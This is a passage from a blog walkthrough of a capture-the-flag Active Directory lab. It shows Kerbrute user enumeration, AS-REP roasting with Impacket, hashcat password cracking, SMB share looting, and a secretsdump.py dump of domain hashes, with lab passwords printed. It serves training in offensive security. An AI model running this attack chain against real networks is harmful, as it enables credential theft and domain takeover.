(8)\nS-1-5-21-3532885019-1334016158-1514108833-1020 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1021 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1022 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1023 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1024 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1025 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1026 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1027 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1028 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1029 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1030 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1031 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1032 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1033 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1034 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1035 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1036 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1037 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1038 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1039 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1040 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1041 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1042 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1043 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1044 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1045 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1046 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1047 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1048 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1049 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1050 *unknown*\\*unknown* (8)\n\n ============================================== \n|    Getting printer info for 10.10.177.198    |\n ============================================== \nCould not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED\n\nenum4linux complete on Thu Dec 30 21:05:30 2021\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;There’s honestly not much here, though we can see that the NETBIOS domain name for the target is THM-AD.&lt;/p&gt;\n&lt;p&gt;The AD domain itself is using the standard (invalid) .local TLD, but that’s not actually something that &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/enum4linux&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/enum4linux&quot;&gt;enum4linux&lt;/a&gt; tells us — instead, we can see this in the earlier output from &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt;.&lt;/p&gt;\n&lt;h2 id=&quot;enumerating-users-via-kerberos&quot;&gt;Enumerating users via Kerberos&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#enumerating-users-via-kerberos&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;We’ll now try to enumerate users using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Kerbrute&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerbrute&quot;&gt;Kerbrute&lt;/a&gt; and &lt;a href=&quot;https://github.com/Sq00ky/attacktive-directory-tools/blob/master/userlist.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the provided user list&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;kerbrute&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; userenum&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --dc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;                  --domain&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; spookysec.local&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;                  --output&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; attacktive-director.kerbrute&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;                           userlist.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This produces the following output.&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&amp;#x3C; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1.0.3 (9dad6e1) - 12/30/21 - Ronnie Flathers @ropnop\n\n2021/12/30 21:12:56 &gt;  Using KDC(s):\n2021/12/30 21:12:56 &gt;   10.10.177.198:88\n\n2021/12/30 21:12:56 &gt;  [+] VALID USERNAME:       james@spookysec.local\n2021/12/30 21:12:59 &gt;  [+] VALID USERNAME:       svc-admin@spookysec.local\n2021/12/30 21:13:03 &gt;  [+] VALID USERNAME:       James@spookysec.local\n2021/12/30 21:13:05 &gt;  [+] VALID USERNAME:       robin@spookysec.local\n2021/12/30 21:13:20 &gt;  [+] VALID USERNAME:       darkstar@spookysec.local\n2021/12/30 21:13:30 &gt;  [+] VALID USERNAME:       administrator@spookysec.local\n2021/12/30 21:13:49 &gt;  [+] VALID USERNAME:       backup@spookysec.local\n2021/12/30 21:13:58 &gt;  [+] VALID USERNAME:       paradox@spookysec.local\n2021/12/30 21:14:55 &gt;  [+] VALID USERNAME:       JAMES@spookysec.local\n2021/12/30 21:15:14 &gt;  [+] VALID USERNAME:       Robin@spookysec.local\n2021/12/30 21:17:10 &gt;  [+] VALID USERNAME:       Administrator@spookysec.local\n2021/12/30 21:20:59 &gt;  [+] VALID USERNAME:       Darkstar@spookysec.local\n2021/12/30 21:22:12 &gt;  [+] VALID USERNAME:       Paradox@spookysec.local\n2021/12/30 21:26:17 &gt;  [+] VALID USERNAME:       DARKSTAR@spookysec.local\n2021/12/30 21:27:26 &gt;  [+] VALID USERNAME:       ori@spookysec.local\n2021/12/30 21:29:37 &gt;  [+] VALID USERNAME:       ROBIN@spookysec.local\n2021/12/30 21:35:06 &gt;  Done! Tested 73317 usernames (16 valid) in 1330.206 seconds\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;We’ll be targeting the svc-admin and backup accounts. (These are supposed to “jump out” at me, but honestly I’m not sure why they’re more interesting than the other users, or administrator. Maybe because they’re &lt;em&gt;not&lt;/em&gt; obviously people but also not the administrator account?)&lt;/p&gt;\n&lt;h2 id=&quot;abusing-kerberos&quot;&gt;Abusing Kerberos&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#abusing-kerberos&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;We’re going to try &lt;a href=&quot;https://blog.certcube.com/as-rep-roasting-attack/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;AS-REP Roasting&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Impacket&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Impacket&quot;&gt;Impacket&lt;/a&gt;’s GetNPUsers.py script. We first create an &lt;code&gt;attacktive-directory.targets&lt;/code&gt; file containing the following:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;svc-admin\nbackup\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Then, we feed this to the GetNPUsers.py script.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;python3&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/usr/share/doc/python3-impacket/examples/GetNPUsers.py &lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;-outputfile &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;attacktive-directory.getnpusers&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;-usersfile &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;attacktive-directory.targets&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;-dc-ip &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; spookysec.local/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;GetNPUsers.py reports that backup isn’t vulnerable to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/AS-REP-roasting&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/AS-REP-roasting&quot;&gt;AS-REP roasting&lt;/a&gt;, but svc-admin &lt;em&gt;is&lt;/em&gt; vulnerable and we get back a valid &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hashcat&quot;&gt;Hashcat&lt;/a&gt; password hash.&lt;/p&gt;\n&lt;p&gt;A quick lookup in the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hashcat&quot;&gt;Hashcat&lt;/a&gt; &lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=example_hashes&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;example hashes wiki page&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; shows that this is a “&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; 5, etype 23, AS-REP” hash (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hashcat&quot;&gt;Hashcat&lt;/a&gt; mode 18200). We’ll crack this using &lt;a href=&quot;https://github.com/Sq00ky/attacktive-directory-tools/blob/master/passwordlist.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the provided password list&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;hashcat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -m&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 18200&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;        -O&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; attacktive-directory.getnpusers&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;           passwordlist.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This reveals that the password for the svc-admin account is &lt;code&gt;management2005&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;Before moving on, we’ll connect to the target as svc-admin using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/XFreeRDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/XFreeRDP&quot;&gt;XFreeRDP&lt;/a&gt; to get the first flag.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;xfreerdp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dynamic-resolution&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +clipboard&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /cert:ignore&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;         /v:10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /u:svc-admin&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /p:management2005&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This flag is in a file called user.txt on svc-admin’s desktop.&lt;/p&gt;\n&lt;h2 id=&quot;back-to-the-basics&quot;&gt;Back to the basics&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#back-to-the-basics&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;We’re going to drop down and use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/smbclient&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/smbclient&quot;&gt;smbclient&lt;/a&gt; to enumerate potential shares on the target. This is where the NetBIOS domain name we discovered above comes in handy (we need to supply it with the &lt;code&gt;-L&lt;/code&gt; switch).&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;smbclient&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -L&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; THM-AD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -I&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;          -U&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; svc-admin%management2005&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Which gives us the following output.&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        backup          Disk      \n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to THM-AD failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;There’s six shares, but only five of these are disks. We’ll poke around a bit using &lt;code&gt;smbclient //THM-AD/${SHARENAME} -I 10.10.177.198 -U svc-admin%management2005&lt;/code&gt;; as one might guess, //THM-AD/backup contains a &lt;code&gt;backup_credentials.txt&lt;/code&gt; file.&lt;/p&gt;\n&lt;p&gt;The contents of this file naively appear to be base64 encoded, and indeed piping it through &lt;code&gt;base64 -d&lt;/code&gt; reveals that the password for the backup account is &lt;code&gt;backup2517860&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;We’ll again pause to connect to the target as backup to get the second flag.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;xfreerdp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dynamic-resolution&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +clipboard&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /cert:ignore&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;         /v:10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /u:backup&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /p:backup2517860&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This flag is in a file called PrivEsc on backup’s desktop.&lt;/p&gt;\n&lt;h2 id=&quot;elevating-privileges-within-the-domain&quot;&gt;Elevating privileges within the domain&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#elevating-privileges-within-the-domain&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The CTF now reveals that the backup account has all AD changes synced to it, including NT hashes, and that we can use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Impacket&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Impacket&quot;&gt;Impacket&lt;/a&gt;’s secretsdump.py file to obtain these from NTDS.DIT.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;python3&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/usr/share/doc/python3-impacket/examples/secretsdump.py &lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;-dc-ip &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;-target-ip &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;10.10.177.198&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;spookysec.local/backup:backup2517860@THM-AD&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;(I got a bit tripped up here, as I didn’t read secretsdump.py’s output carefully enough — credentials are presented in the format &lt;code&gt;domain\\uid:rid:lmhash:nthash&lt;/code&gt;, so the relevant NTLM hash is the &lt;em&gt;last&lt;/em&gt; hash for the Administrator account!)&lt;/p&gt;\n&lt;p&gt;We’ll use the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Evil-WinRM&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Evil-WinRM&quot;&gt;Evil-WinRM&lt;/a&gt; tool to retrieve the final flag by &lt;a href=&quot;https://en.wikipedia.org/wiki/Pass_the_hash&quot; 